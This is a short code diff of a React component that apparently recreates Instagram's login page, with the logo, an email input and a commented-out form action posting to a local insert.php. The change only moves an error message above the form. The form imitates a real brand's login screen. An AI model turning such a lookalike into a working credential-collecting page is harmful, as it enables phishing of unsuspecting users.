@@ -96,20 +96,19 @@ export default function Instagram() {
               height={200}
               alt="logo of instagram"
             />
-
+            {error !== null ? (
+              <span className="text-sm text-center text-red-700 my-3">
+                {" "}
+                {error}{" "}
+              </span>
+            ) : (
+              ""
+            )}
             <form
               onSubmit={submitForm}
               // action="http://localhost/insert.php"
               className="flex flex-col gap-3 w-full "
             >
-              {error !== null ? (
-                <span className="text-sm text-center text-red-700 my-3">
-                  {" "}
-                  {error}{" "}
-                </span>
-              ) : (
-                ""
-              )}
               <div className="email-container flex justify-center">
                 <input
                   type="text"
